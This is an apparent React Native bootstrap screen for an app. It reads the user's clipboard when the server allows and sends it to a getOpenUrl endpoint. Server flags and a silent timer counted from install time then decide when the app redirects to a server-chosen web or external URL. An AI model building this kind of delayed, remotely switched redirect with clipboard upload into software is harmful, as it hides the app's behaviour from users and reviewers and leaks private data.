import React, { useCallback, useEffect, useRef, useState } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Stack, useRouter } from 'expo-router';
import { ActivityIndicator, AppState, StyleSheet, View } from 'react-native';
import NetworkErrorScreen from '@/components/common/NetworkErrorScreen';
import { initDomain } from '@/services/domainSelector';
import { systemApi } from '@/services/api';
import { configureAppsFlyerAttribution, readCurrentAppsFlyerDeepLinkParams, registerAppsFlyerUrlOpenListener, startAppsFlyerAttribution } from '@/services/appsFlyerAttribution';
import useAppStore from '@/store/useAppStore';
import useLangStore from '@/store/useLangStore';
import useUserStore from '@/store/useUserStore';
import { isEmpty } from '@/utils';
import { getInstallTime } from '@/utils/storage';
import {
    OPEN_URL_DEBUG_TAG,
    OPEN_URL_KEYS,
    cacheAppsFlyerDeepLinkParamsForJump,
    cacheOpenUrlClipboardConfigForJump,
    cacheOpenUrlClipboardContentForJump,
    canOverrideCachedAppsFlyerDeepLinkParams,
    devLog,
    devWarn,
    getCachedAppsFlyerDeepLinkParams,
    getCachedOpenUrlClipboardConfig,
    getCachedOpenUrlClipboardContent,
    getJumpFlag,
    isSupportedLinkType,
    jumpByLinkType,
    overwriteCachedAppsFlyerDeepLinkParams,
    readDeferredJump,
    saveDeferredJump,
    setJumpFlag,
} from '@/services/openUrlJump';
import { resolveInternalEntryRoute } from '@/services/internalEntryRoute';

const INSTALL_FLAG_KEY = 'STAT_INSTALLED';

/**
 * 启动页 - 负责初始化和启动分流
 *
 * 启动链路（首次决策）：
 * 1) 恢复本地用户与语言状态
 * 2) 选择域名
 * 3) 请求 init
 * 4) 请求 getOpenUrl（首次决策是否立即跳转/开始静默计时）
 * 5) 未命中 OpenUrl 跳转时，按 getOpenUrl 返回的 abTest 进入 App 内部落地页（/home 或 B 模块入口）
 *
 * 决策优先级：
 * - OPEN_URL_JUMPED=1：认为已命中过跳转，后续只要返回 targetUrl 就直接跳，不再判断 isOpen
 * - readClipboard=1 且确定跳转：缓存本次提交的 clipboardContent，后续 getOpenUrl 优先复用缓存内容
 * - checkTime > 0：保存 OPEN_URL_DEFERRED_JUMP，进入首页，后续到点由根 layout 刷新 URL 并按最新 isOpen 判断
 * - isOpen !== '1'：非静默场景不跳转
 * - isOpen === '1' && checkTime <= 0：立即跳转
 *
 * 分支说明：
 * - checkTime > 0：首次启动会先保存静默计时，不管首次 isOpen 是多少。
 * - 静默到点后：重新请求 getOpenUrl，只有最新 isOpen === '1' 且 targetUrl/linkType 有效才跳。
 * - checkTime <= 0：非静默立即跳转前，也要求首次 isOpen === '1'。
 * - isOpen !== '1'：不会跳转。
 * - 唯一例外：本地已有 OPEN_URL_JUMPED=1 时，会优先走“已跳过”分支，只要接口返回 targetUrl 就直接跳，不再判断 isOpen。
 */
export default function BootstrapScreen() {
    const router = useRouter();
    const setBootstrapBase = useAppStore((state) => state.setBootstrapBase);
    const initUser = useUserStore((state) => state.initUser);
    const initLang = useLangStore((state) => state.initLang);
    const [status, setStatus] = useState('loading');
    const [retrying, setRetrying] = useState(false);
    const isRunningRef = useRef(false);
    const initSuccessRef = useRef(false);
    const appsFlyerDeepLinkParamsRef = useRef(null);

    const requestOpenUrl = useCallback(async (base) => {
        appsFlyerDeepLinkParamsRef.current = null;
        const h5Verify = await AsyncStorage.getItem(OPEN_URL_KEYS.JUMP_FLAG_KEY).catch(() => '') ?? '';
        devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: start', { h5Verify, readClipboard: base?.readClipboard });
        const cachedClipboardConfig = await getCachedOpenUrlClipboardConfig();

        const requestOpenUrlWithClipboardContent = async (clipboardContent) => {
            const openUrlRes = await systemApi.getOpenUrl(clipboardContent, h5Verify, cachedClipboardConfig);
            return { openUrlRes, clipboardContent };
        };

        const cachedClipboardContent = await getCachedOpenUrlClipboardContent();
        if (cachedClipboardContent !== null) {
            devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: with cached clipboard', { preview: cachedClipboardContent.slice(0, 32) });
            return requestOpenUrlWithClipboardContent(cachedClipboardContent);
        }

        const cachedAppsFlyerDeepLinkParams = await getCachedAppsFlyerDeepLinkParams();
        const cachedAppsFlyerDeepLinkValue = String(cachedAppsFlyerDeepLinkParams?.deep_link_value ?? '');
        if (cachedAppsFlyerDeepLinkValue) {
            devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: with cached AppsFlyer deep_link_value', { preview: cachedAppsFlyerDeepLinkValue.slice(0, 32) });
            appsFlyerDeepLinkParamsRef.current = cachedAppsFlyerDeepLinkParams;
            return requestOpenUrlWithClipboardContent(cachedAppsFlyerDeepLinkValue);
        }

        if (h5Verify === '1') {
            devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: jumped=1, request with empty clipboard');
            return requestOpenUrlWithClipboardContent('');
        }

        const appsFlyerDeepLinkParams = await readCurrentAppsFlyerDeepLinkParams();
        const appsFlyerDeepLinkValue = String(appsFlyerDeepLinkParams?.deep_link_value ?? '');
        if (appsFlyerDeepLinkValue) {
            devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: with AppsFlyer deep_link_value', { preview: appsFlyerDeepLinkValue.slice(0, 32) });
            appsFlyerDeepLinkParamsRef.current = appsFlyerDeepLinkParams;
            return requestOpenUrlWithClipboardContent(appsFlyerDeepLinkValue);
        }

        // init 返回允许读剪贴板时，才携带剪贴板内容请求 getOpenUrl
        if (base?.readClipboard === '1') {
            try {
                const Clipboard = require('expo-clipboard');
                const clipboardContent = await Clipboard.getStringAsync();
                devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: with clipboard', { preview: (clipboardContent ?? '').slice(0, 32) });
                return requestOpenUrlWithClipboardContent(clipboardContent ?? '');
            } catch {
                // 读取剪切板失败时回退到空内容
                devWarn(OPEN_URL_DEBUG_TAG, 'getOpenUrl: clipboard read failed, fallback empty');
            }
        }

        devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: request with empty clipboard');
        return requestOpenUrlWithClipboardContent('');
    }, []);

    const finishToInternalEntry = useCallback(async (abTest) => {
        initSuccessRef.current = true;
        const route = await resolveInternalEntryRoute(abTest);
        devLog(OPEN_URL_DEBUG_TAG, 'route: replace internal entry', { route, abTest: String(abTest ?? '') });
        router.replace(route);
    }, [router]);

    const doJump = useCallback(async (linkType, targetUrl, abTest, appsFlyerDeepLinkParams) => {
        const type = await jumpByLinkType({ router, linkType, targetUrl, appsFlyerDeepLinkParams });
        if (type === 'webview') {
            initSuccessRef.current = true;
            return true;
        }
        if (type === 'external') {
            await finishToInternalEntry(abTest);
            return true;
        }
        return false;
    }, [finishToInternalEntry, router]);

    const handleOpenUrl = useCallback(async (res, base, clipboardContent) => {
        const data = res?.data;
        if (isEmpty(data)) {
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: empty data');
            return false;
        }

        const { fingerprint, isOpen, linkType, targetUrl, abTest, clipboardConfig } = data;
        const jumped = await getJumpFlag();
        const cacheOpenUrlJumpRequestState = async (nextLinkType, nextTargetUrl) => {
            await cacheOpenUrlClipboardContentForJump({
                readClipboard: base?.readClipboard,
                clipboardContent,
                isOpen,
                linkType: nextLinkType,
                targetUrl: nextTargetUrl,
            });
            await cacheOpenUrlClipboardConfigForJump({
                readClipboard: base?.readClipboard,
                clipboardContent,
                clipboardConfig,
                isOpen,
                linkType: nextLinkType,
                targetUrl: nextTargetUrl,
            });
            const appsFlyerDeepLinkParams = appsFlyerDeepLinkParamsRef.current;
            const appsFlyerDeepLinkValue = String(appsFlyerDeepLinkParams?.deep_link_value ?? '');
            await cacheAppsFlyerDeepLinkParamsForJump({
                appsFlyerDeepLinkParams: appsFlyerDeepLinkValue === clipboardContent ? appsFlyerDeepLinkParams : null,
                isOpen,
                linkType: nextLinkType,
                targetUrl: nextTargetUrl,
            });
        };

        if (isEmpty(targetUrl) && jumped === '1') {
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: jumped=1 but empty targetUrl', { isOpen, linkType });
            return false;
        }

        if (jumped === '1') {
            // 本地已有命中标记时，只要返回 targetUrl 就直接分流
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: jumped=1, jump now', { linkType, targetUrl });
            await cacheOpenUrlJumpRequestState(linkType, targetUrl);
            return doJump(linkType, targetUrl, abTest, appsFlyerDeepLinkParamsRef.current);
        }

        const checkTimeSeconds = Number(base?.checkTime ?? 0);
        const normalizedLinkType = String(linkType ?? '');
        const canJump = isSupportedLinkType(normalizedLinkType);

        // 静默计时：只要 init 配置了 checkTime 就开启；到点后由根 layout 再请求一次 getOpenUrl，并按最新 isOpen 判断是否跳转
        if (Number.isFinite(checkTimeSeconds) && checkTimeSeconds > 0) {
            const installTimeSeconds = await getInstallTime();
            const triggerAtMs = (Math.floor(installTimeSeconds) + Math.floor(checkTimeSeconds)) * 1000;
            const remainingMs = triggerAtMs - Date.now();
            devLog(OPEN_URL_DEBUG_TAG, 'silent decision', {
                installTimeSeconds,
                checkTimeSeconds,
                nowMs: Date.now(),
                triggerAtMs,
                remainingMs,
                isOpen,
                linkType: normalizedLinkType,
            });

            if (remainingMs > 0) {
                await saveDeferredJump({
                    triggerAtMs,
                    linkType: normalizedLinkType,
                    targetUrl,
                    fingerprint: fingerprint ?? '',
                    abTest,
                    readClipboard: base?.readClipboard,
                });
                devLog(OPEN_URL_DEBUG_TAG, 'saved deferred jump', { triggerAtMs, linkType: normalizedLinkType, targetUrl });
                return false;
            }

            if (isOpen !== '1') {
                devLog(OPEN_URL_DEBUG_TAG, 'silent decision: time reached but isOpen!=1, no jump', { isOpen, linkType: normalizedLinkType });
                return false;
            }

            if (isEmpty(targetUrl)) {
                devLog(OPEN_URL_DEBUG_TAG, 'silent decision: time reached but empty targetUrl', { isOpen, linkType: normalizedLinkType });
                return false;
            }

            if (!canJump) {
                devLog(OPEN_URL_DEBUG_TAG, 'silent decision: time reached but invalid linkType, no jump', { linkType });
                return false;
            }

            // 已到触发时间，直接执行跳转
            if (fingerprint) {
                systemApi.fingerprintDelete(fingerprint).catch(() => { });
            }
            await setJumpFlag();
            await cacheOpenUrlJumpRequestState(normalizedLinkType, targetUrl);
            devLog(OPEN_URL_DEBUG_TAG, 'silent decision: time reached, jump now', { linkType: normalizedLinkType, targetUrl });
            return doJump(normalizedLinkType, targetUrl, abTest, appsFlyerDeepLinkParamsRef.current);
        }

        if (isOpen !== '1') {
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: isOpen!=1, no jump', {
                isOpen,
                linkType,
                checkTimeSeconds,
            });
            return false;
        }

        if (isEmpty(targetUrl)) {
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: empty targetUrl', { isOpen, linkType, checkTimeSeconds });
            return false;
        }

        // 非静默：isOpen 已确认开启，checkTime <= 0 时立即跳转
        if (Number.isFinite(checkTimeSeconds) && checkTimeSeconds <= 0) {
            if (!canJump) {
                devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: checkTime<=0 but invalid linkType, no jump', { linkType });
                return false;
            }

            if (fingerprint) {
                systemApi.fingerprintDelete(fingerprint).catch(() => { });
            }
            await setJumpFlag();
            await cacheOpenUrlJumpRequestState(normalizedLinkType, targetUrl);
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: checkTime<=0 immediate, jump now', { linkType: normalizedLinkType, targetUrl });
            return doJump(normalizedLinkType, targetUrl, abTest, appsFlyerDeepLinkParamsRef.current);
        }

        devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: no jump', { isOpen, linkType, checkTimeSeconds });
        return false;
    }, [doJump]);

    const runBootstrap = useCallback(async () => {
        if (isRunningRef.current) {
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: skip, already running');
            return;
        }

        isRunningRef.current = true;
        // 重试和首屏进入统一走 loading 态
        setStatus('loading');
        devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: start');

        try {
            // 启动页统一负责恢复本地用户和语言状态
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initUser/initLang');
            await Promise.all([initUser(), initLang()]);
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initUser/initLang done');

            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initDomain');
            await initDomain();
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initDomain done');

            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.init');
            const initRes = await systemApi.init();
            const base = initRes?.data?.base ?? null;
            const appsFlyerConfig = initRes?.data?.af ?? null;
            configureAppsFlyerAttribution(appsFlyerConfig);
            startAppsFlyerAttribution();
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.init done', { checkTime: base?.checkTime, readClipboard: base?.readClipboard });
            // 将 init 返回的基础配置暂存起来，供 home 进入后补拉语言包
            setBootstrapBase(base);

            if (canOverrideCachedAppsFlyerDeepLinkParams(appsFlyerConfig)) {
                devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: AppsFlyer deep link cache override enabled');
                const appsFlyerDeepLinkParams = await readCurrentAppsFlyerDeepLinkParams();
                await overwriteCachedAppsFlyerDeepLinkParams(appsFlyerDeepLinkParams);
            }

            const h5Verify = await AsyncStorage.getItem(OPEN_URL_KEYS.JUMP_FLAG_KEY).catch(() => '') ?? '';
            if (h5Verify !== '1') {
                // 已有静默计时任务时，不需要重复请求 getOpenUrl
                const deferred = await readDeferredJump();
                if (deferred) {
                    devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: deferred exists, skip getOpenUrl and go internal', deferred);
                    await finishToInternalEntry(deferred?.abTest ?? null);
                    return;
                }
            }

            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.getOpenUrl');
            const openUrlRequest = await requestOpenUrl(base);
            const openUrlRes = openUrlRequest?.openUrlRes;
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.getOpenUrl done', {
                hasData: !!openUrlRes?.data,
                isOpen: openUrlRes?.data?.isOpen,
                linkType: openUrlRes?.data?.linkType,
                hasTargetUrl: !!openUrlRes?.data?.targetUrl,
            });

            const didJump = await handleOpenUrl(openUrlRes, base, openUrlRequest?.clipboardContent ?? '');
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: decision done', { didJump });
            if (!didJump) {
                // 未命中任何策略时，才进入 App 内部首页
                await finishToInternalEntry(openUrlRes?.data?.abTest ?? null);
            }
        } catch (e) {
            devWarn(OPEN_URL_DEBUG_TAG, 'bootstrap: failed, show error', e);
            setStatus('error');
        } finally {
            isRunningRef.current = false;
            setRetrying(false);
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: end');
        }
    }, [finishToInternalEntry, handleOpenUrl, initLang, initUser, requestOpenUrl, setBootstrapBase]);

    useEffect(() => {
        devLog(OPEN_URL_DEBUG_TAG, 'BootstrapScreen: mount');
        registerAppsFlyerUrlOpenListener();

        // 首次安装时上报一次 install 事件
        AsyncStorage.getItem(INSTALL_FLAG_KEY).then((installed) => {
            if (!installed) {
                devLog(OPEN_URL_DEBUG_TAG, 'stat: install');
                systemApi.sendStat('install')
                    .then(() => AsyncStorage.setItem(INSTALL_FLAG_KEY, '1'))
                    .catch(() => { });
            }
        }).catch(() => { });

        runBootstrap();

        const appStateListener = AppState.addEventListener('change', (nextState) => {
            devLog(OPEN_URL_DEBUG_TAG, 'AppState change', { nextState });
            // 首次安装等场景下，系统授权弹窗可能打断启动链路，回前台后允许再触发一次
            if (nextState === 'active' && !initSuccessRef.current) {
                devLog(OPEN_URL_DEBUG_TAG, 'AppState active, rerun bootstrap');
                runBootstrap();
            }
        });

        return () => {
            devLog(OPEN_URL_DEBUG_TAG, 'BootstrapScreen: unmount');
            appStateListener.remove();
        };
    }, [runBootstrap]);

    return (
        <>
            <Stack.Screen options={{ headerShown: false }} />
            <View style={styles.container}>
                <ActivityIndicator size="large" color="#3961FB" />
            </View>
            {status === 'error' && (
                <NetworkErrorScreen
                    loading={retrying}
                    onPress={() => {
                        devLog(OPEN_URL_DEBUG_TAG, 'ui: retry pressed');
                        setRetrying(true);
                        runBootstrap();
                    }}
                />
            )}
        </>
    );
}

const styles = StyleSheet.create({
    container: {
        flex: 1,
        backgroundColor: '#FFFFFF',
        justifyContent: 'center',
        alignItems: 'center',
    },
});
